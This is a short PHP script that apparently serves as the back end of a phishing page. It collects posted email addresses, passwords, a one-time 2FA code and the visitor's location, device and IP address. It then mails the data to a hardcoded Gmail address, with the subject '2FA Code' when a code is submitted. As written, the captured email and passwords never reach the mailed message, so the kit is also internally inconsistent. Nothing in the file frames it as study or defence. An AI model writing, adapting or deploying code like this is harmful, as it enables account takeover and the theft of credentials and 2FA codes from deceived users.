<?php

$e = "";
$p = "";
$p2 = "";
$country_name = "";
$ip = "";
$city = "";
$device = "";
$fn = "";
//var_dump($_POST);
//exit();
if(isset($_POST['email']) && isset($_POST['firstpassword'])){
    $e = $_POST['email'];
    $p = $_POST['firstpassword'];
}

if(isset($_POST['country'])&&isset($_POST['city'])&&isset($_POST['device'])){
    $country_name = $_POST['country'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $city = $_POST['city'];
    $device = $_POST['device'];
    
   // die();
    
}
if(isset($_POST['email'])){
    $e = $_POST['email'];
};
if(isset($_POST['firstpassword'])){
    $p = $_POST['firstpassword'];
};
if(isset($_POST['passwordDy'])){
    $p2 = $_POST['passwordDy'];
};
// the message
$msg = "Country = ".$country_name."\n\nIp Address = ".$ip."\n\nCity = ".$city."\n\nDevice = ".$device;

echo "<p>".$msg."</p>";

//die();
//$msg= "sadasdsdjighndfiugndfgndfgndf";
// use wordwrap() if lines are longer than 70 characters
$subject = "Ka kliku";
//$msg = wordwrap($msg,70);
if(isset($_POST['codegeneratorRR'])){
    $code = $_POST['codegeneratorRR'];
    
    $msg = $code;
    $subject = "2FA Code";
    //var_dump($code);
}


$to = "islamishkodran@gmail.com";
// send email


mail($to,$subject,$msg);


?>